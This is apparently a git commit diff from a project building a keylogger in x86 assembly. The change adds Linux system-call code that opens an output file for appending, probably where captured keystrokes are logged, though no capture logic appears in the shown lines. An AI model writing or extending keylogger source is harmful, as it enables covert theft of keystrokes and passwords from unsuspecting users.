9bbfe4935780a5b981ba16a4fe14f1c9412f716f
quentin-csg <qcassaigne73@gmail.com>
2024-04-30 19:32:37 +0200

    create_output_file

--- keylogger.s
+++ keylogger.s
@@ -17,3 +17,11 @@ _start:
     int 0x80
 
     mov esi, eax 
+
+    mov edx, 420          ; 644
+    mov ecx, 2101o        ; O_WRONLY | O_CREAT | O_APPEND
+    mov ebx, output_file
+    mov eax, 5            ; SYS_OPEN
+    int 0x80
+
+    mov edi, eax 
